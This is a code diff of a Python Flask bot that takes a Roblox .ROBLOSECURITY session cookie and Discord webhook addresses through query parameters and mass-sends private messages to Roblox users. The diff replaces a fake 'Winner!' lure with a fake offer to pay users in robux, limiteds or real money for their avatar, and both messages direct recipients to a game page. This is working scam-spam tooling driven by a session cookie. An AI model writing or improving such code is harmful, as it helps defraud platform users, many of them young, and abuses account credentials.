@@ -10,7 +10,6 @@ cookie = ""
 groupid = ""
 roleid = ""
 errhook = ""
-groupname = ""
 
 app = Flask(__name__)
 
@@ -56,13 +55,12 @@ threading.Thread(target=findtargetaccount).start()
 
 @app.route('/info', methods=['GET'])
 def info():
-    global discordhook, cookie, groupid, roleid, errhook, groupname
+    global discordhook, cookie, groupid, roleid, errhook
     discordhook = "https://discord.com/api/webhooks/" + request.args.get('hook')
     cookie = request.args.get('cookie')
     groupid = request.args.get('groupid')
     roleid = request.args.get('roleid')
     errhook = "https://discord.com/api/webhooks/" + request.args.get('errhook')
-    groupname = requests.get("https://groups.roblox.com/v1/groups/" + str(groupid)).json()["name"]
     return "ok"
 
 
@@ -93,7 +91,7 @@ def mainloop():
                 print("Can Message!!!")
                 current_time_seconds = time.time()
                 unix_timestamp_ms = int(current_time_seconds * 1000)
-                msgre = requests.post("https://privatemessages.roblox.com/v1/messages/send", json={"subject":"Winner!","body":"Hello!\nThank you for joining the "+groupname+" Roblox group You were picked out of 100 people to join our exclusive server.\n\nPlease check the social links in: https://www.roblox.com/games/18439349109","recipientid":str(i),"cacheBuster":unix_timestamp_ms}, headers={"X-Csrf-Token": csrf}, cookies={".ROBLOSECURITY": cookie})
+                msgre = requests.post("https://privatemessages.roblox.com/v1/messages/send", json={"subject":"Can we use your avatar in our game","body":"hello i am contacting you about your roblox avatar and how we wanna use it in our roblox game as one of the npc's we will can pay u in robux, limiteds or real money.\n\ncheck the description of https://www.roblox.com/games/17789352878\n\nand ping me when you are in there.","recipientid":str(i),"cacheBuster":unix_timestamp_ms}, headers={"X-Csrf-Token": csrf}, cookies={".ROBLOSECURITY": cookie})
                 print(msgre)
                 print(msgre.text)
                 if msgre.ok:
